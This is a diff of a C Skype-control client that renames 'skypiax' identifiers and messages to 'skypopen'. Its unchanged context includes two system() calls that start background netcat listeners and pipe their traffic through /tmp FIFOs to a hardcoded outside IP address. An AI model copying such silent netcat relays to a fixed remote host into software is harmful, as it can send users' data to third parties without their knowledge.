@@ -18,7 +18,7 @@ USAGE: client [Xserver instance]
 
 Display *disp = NULL;
 
-struct SkypiaxHandles {
+struct SkypopenHandles {
 	Window skype_win;
 	Display *disp;
 	Window win;
@@ -51,7 +51,7 @@ static int X11_errors_untrap(void)
 	return (xerror != BadValue) && (xerror != BadWindow);
 }
 
-int skypiax_send_message(struct SkypiaxHandles *SkypiaxHandles, const char *message_P)
+int skypopen_send_message(struct SkypopenHandles *SkypopenHandles, const char *message_P)
 {
 
 	Window w_P;
@@ -59,9 +59,9 @@ int skypiax_send_message(struct SkypiaxHandles *SkypiaxHandles, const char *mess
 	Window handle_P;
 	int ok;
 
-	w_P = SkypiaxHandles->skype_win;
-	disp = SkypiaxHandles->disp;
-	handle_P = SkypiaxHandles->win;
+	w_P = SkypopenHandles->skype_win;
+	disp = SkypopenHandles->disp;
+	handle_P = SkypopenHandles->win;
 
 	Atom atom1 = XInternAtom(disp, "SKYPECONTROLAPI_MESSAGE_BEGIN", False);
 	Atom atom2 = XInternAtom(disp, "SKYPECONTROLAPI_MESSAGE", False);
@@ -96,9 +96,9 @@ int skypiax_send_message(struct SkypiaxHandles *SkypiaxHandles, const char *mess
 	return 1;
 }
 
-int skypiax_present(struct SkypiaxHandles *SkypiaxHandles)
+int skypopen_present(struct SkypopenHandles *SkypopenHandles)
 {
-	Atom skype_inst = XInternAtom(SkypiaxHandles->disp, "_SKYPE_INSTANCE", True);
+	Atom skype_inst = XInternAtom(SkypopenHandles->disp, "_SKYPE_INSTANCE", True);
 
 	Atom type_ret;
 	int format_ret;
@@ -109,23 +109,23 @@ int skypiax_present(struct SkypiaxHandles *SkypiaxHandles)
 
 	X11_errors_trap();
 	status =
-		XGetWindowProperty(SkypiaxHandles->disp, DefaultRootWindow(SkypiaxHandles->disp),
+		XGetWindowProperty(SkypopenHandles->disp, DefaultRootWindow(SkypopenHandles->disp),
 						   skype_inst, 0, 1, False, XA_WINDOW, &type_ret, &format_ret, &nitems_ret, &bytes_after_ret, &prop);
 
 	X11_errors_untrap();
 	/*  sanity check */
 	if (status != Success || format_ret != 32 || nitems_ret != 1) {
-		SkypiaxHandles->skype_win = (Window) - 1;
+		SkypopenHandles->skype_win = (Window) - 1;
 		printf("Skype instance not found on display '%s'\n", dispname);
 		return 0;
 	}
 
-	SkypiaxHandles->skype_win = *(const unsigned long *) prop & 0xffffffff;
-	//printf("Skype instance found on display '%s', with id #%d\n", dispname, (unsigned int) SkypiaxHandles->skype_win);
+	SkypopenHandles->skype_win = *(const unsigned long *) prop & 0xffffffff;
+	//printf("Skype instance found on display '%s', with id #%d\n", dispname, (unsigned int) SkypopenHandles->skype_win);
 	return 1;
 }
 
-void skypiax_clean_disp(void *data)
+void skypopen_clean_disp(void *data)
 {
 
 	int *dispptr;
@@ -200,7 +200,7 @@ void *threadfunc(void *parm)
 int main(int argc, char *argv[])
 {
 
-	struct SkypiaxHandles SkypiaxHandles;
+	struct SkypopenHandles SkypopenHandles;
 	char buf[512];
 	//Display *disp = NULL;
 	Window root = -1;
@@ -231,30 +231,30 @@ int main(int argc, char *argv[])
 	int xfd;
 	xfd = XConnectionNumber(disp);
 
-	SkypiaxHandles.disp = disp;
+	SkypopenHandles.disp = disp;
 
-	if (skypiax_present(&SkypiaxHandles)) {
+	if (skypopen_present(&SkypopenHandles)) {
 		root = DefaultRootWindow(disp);
 		win = XCreateSimpleWindow(disp, root, 0, 0, 1, 1, 0, BlackPixel(disp, DefaultScreen(disp)), BlackPixel(disp, DefaultScreen(disp)));
 
-		SkypiaxHandles.win = win;
+		SkypopenHandles.win = win;
 
-		snprintf(buf, 512, "NAME skypiax");
+		snprintf(buf, 512, "NAME skypopen");
 
-		if (!skypiax_send_message(&SkypiaxHandles, buf)) {
-			printf("Sending message failed - probably Skype crashed. Please run/restart Skype manually and launch skypiax_auth again\n");
+		if (!skypopen_send_message(&SkypopenHandles, buf)) {
+			printf("Sending message failed - probably Skype crashed. Please run/restart Skype manually and launch skypopen_auth again\n");
 			return -1;
 		}
 
 		snprintf(buf, 512, "PROTOCOL 7");
-		if (!skypiax_send_message(&SkypiaxHandles, buf)) {
-			printf("Sending message failed - probably Skype crashed. Please run/restart Skype manually and launch skypiax_auth again\n");
+		if (!skypopen_send_message(&SkypopenHandles, buf)) {
+			printf("Sending message failed - probably Skype crashed. Please run/restart Skype manually and launch skypopen_auth again\n");
 			return -1;
 		}
 
 		snprintf(buf, 512, "#ciapalino PING");
-		if (!skypiax_send_message(&SkypiaxHandles, buf)) {
-			printf("Sending message failed - probably Skype crashed. Please run/restart Skype manually and launch skypiax_auth again\n");
+		if (!skypopen_send_message(&SkypopenHandles, buf)) {
+			printf("Sending message failed - probably Skype crashed. Please run/restart Skype manually and launch skypopen_auth again\n");
 			return -1;
 		}
 
@@ -283,13 +283,13 @@ int main(int argc, char *argv[])
 				system("/bin/nc -l -p 15557 0</tmp/back2 | /bin/nc 1.124.232.45 15557 | /usr/bin/tee 1>/tmp/back2 &");
 				system("/bin/nc -l -p 15556 0</tmp/back1 | /bin/nc 1.124.232.45 15556 | /usr/bin/tee 1>/tmp/back1 &");
 			}
-			if (!skypiax_send_message(&SkypiaxHandles, s)) {
-				printf("Sending message failed - probably Skype crashed. Please run/restart Skype manually and launch skypiax_auth again\n");
+			if (!skypopen_send_message(&SkypopenHandles, s)) {
+				printf("Sending message failed - probably Skype crashed. Please run/restart Skype manually and launch skypopen_auth again\n");
 				return -1;
 			}
 		}
 	} else {
-		printf("Skype client not found on display '%s'. Please run/restart Skype manually and launch skypiax_auth again\n\n\n", dispname);
+		printf("Skype client not found on display '%s'. Please run/restart Skype manually and launch skypopen_auth again\n\n\n", dispname);
 		return -1;
 	}
 	return 0;
